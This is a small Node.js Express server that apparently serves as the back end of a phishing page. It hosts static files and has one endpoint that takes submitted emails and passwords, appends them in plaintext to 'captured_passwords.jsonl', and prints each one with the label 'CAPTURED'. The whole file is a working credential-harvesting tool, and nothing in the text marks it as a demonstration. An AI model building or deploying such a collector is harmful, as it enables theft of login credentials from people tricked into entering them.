const express = require("express");
const fs = require("fs");
const app = express();
app.use(express.json());
app.use(express.static(__dirname));

app.post("/api/save-password", (req, res) => {
  const entry = { ...req.body, savedAt: new Date().toISOString() };
  fs.appendFileSync("captured_passwords.jsonl", JSON.stringify(entry) + "\n");
  console.log("CAPTURED:", entry.email, "->", entry.password);
  res.json({ ok: true });
});

app.listen(3000, () => console.log("Running at http://localhost:3000"));